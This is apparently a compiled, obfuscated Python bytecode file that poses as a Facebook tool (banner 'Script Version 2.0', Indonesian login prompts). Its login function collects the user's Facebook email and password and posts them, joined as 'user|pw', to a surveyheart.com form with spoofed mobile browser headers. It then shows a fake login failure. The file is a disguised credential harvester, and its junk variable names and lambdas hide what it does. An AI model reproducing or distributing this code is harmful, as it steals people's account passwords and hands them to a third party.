o
    �(�b    �                   @   s�   d d� Z e � r	d�Z ddlZddlZddlZddlZddlZddlZddl	m	Z	 dd� Z
dd	� Zd
d� Zze�  W dS  eyF   e�  Y dS w )c                   C   s   d S )N� r   r   r   �<MasterPiece>�<lambda>   �    r   �OOOOOOOOOOOOOOO�    N��pwinputc                 C   s�   dd� }|� r	d�}dddd| d�gt tt�� ��d	d
�}z"tjd|ddt ttj�|���ddddddddddd�dd� W |S  t	yL   t
d� Y |S w )Nc                   S   s   d S )Nr   r   r   r   r   r      r   �senddata.<locals>.<lambda>r   �62d3dcbd29b76721979c33b7� �62d3dcbd29b76721979c33b9�	LONG_TEXT�Zquestion_id�type�textr   �Zform_idZemailZ	responsesZsubmit_timeZstorage_used� https://surveyheart.com/response�surveyheart.com�
keep-alive�!application/json, text/plain, */*��Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36�application/json;charset=UTF-8�https://surveyheart.com�mark.via.gp�same-origin�cors�empty�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�ZHostZ
ConnectionzContent-LengthZAcceptz
User-AgentzContent-TypeZOriginzX-Requested-WithzSec-Fetch-SitezSec-Fetch-ModezSec-Fetch-DestzAccept-EncodingzAccept-LanguageF�ZjsonZheadersZallow_redirects�   (×) Connection Error)�str�int�time�rek�post�len�urllib�parse�	urlencode�	Exception�exit)�url�
OOOOOOOOOO�datar   r   r   �senddata   s    
&@�
�r0   c                  C   s(   dd� } | � r	d�} t �d� td� d S )Nc                   S   s   d S )Nr   r   r   r   r   r      r   �banner.<locals>.<lambda>r   �clear�q  Script Version 2.0
  ____  ____ ____      __  _  ____  _      _     
 /    ||    \    |    |  |/ ]|    || |    | |    
|  o  ||  o  )  |     |  ' /  |  | | |    | |    
|     ||   _/|  |     |    \  |  | | |___ | |___ 
|  _  ||  |  |  |     |     | |  | |     ||     |
|  |  ||  |  |  |     |  .  | |  | |     ||     |
|__|__||__| |____|    |__|\_||____||_____||_____|
)�os�system�print)r.   r   r   r   �banner   s    
r7   c                  C   s�   dd� } | � r	d�} d}t �  td� td� |r3td�}|dkr%td	� nt|�d
k r0td� nn|s|rQtdd�}|dkrCtd	� nt|�d
k rNtd� nn|s5td� t|d | �}|d rutd� tdd��|d � td� d S td� d S )Nc                   S   s   d S )Nr   r   r   r   r   r      r   �login.<locals>.<lambda>r   T�+(!) Silahkan Login Ke Facebook untuk lanjut�+(!) Jangan Gunakan VPN Agar Tidak Cekpoint
�(?) Email : r   �      Dont Be Empty�   �      Wrong email�(?) Password : ��prompt�      Wrong password�
(+) Trying Login�|�access_token�   (✓) Login Sukses
�	login.txt�w�#
(!) Silahkan Mulai Ulang Tools Ini�   (×) Login Gagal)	r7   r6   �inputr'   r   r0   �open�writer,   )r.   �t�user�pw�cdatar   r   r   �login   s8    


�


�rR   )r.   �requestsr%   r4   �sysr$   �getpass�urllib.parser(   r   r0   r7   rR   �KeyboardInterruptr,   r   r   r   r   �<module>   s    
(	�